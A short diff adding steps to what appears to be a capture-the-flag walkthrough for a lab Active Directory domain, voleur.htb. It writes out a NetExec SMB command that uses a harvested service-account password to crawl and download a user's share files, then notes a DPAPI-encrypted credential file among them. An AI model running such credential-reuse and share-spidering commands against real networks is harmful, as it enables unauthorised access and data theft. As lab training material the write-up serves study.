@@ -96,4 +96,10 @@
 
 <img width="659" height="71" alt="image" src="https://github.com/user-attachments/assets/2c3cb778-85c6-4675-ad58-024470cc24cf" />
 
-15. 
+15. Use todd wolfe's credentials to download Todd's files on smb
+
+`nxc smb dc.voleur.htb -k -u svc_ldap -p 'M1XyC9pW7qT5Vn' -d voleur.htb -M spider_plus -o DOWNLOAD_FLAG=True`
+
+16. This downloads Todd's files from smb and we find a DPAPI encrypted credential file
+
+17. 
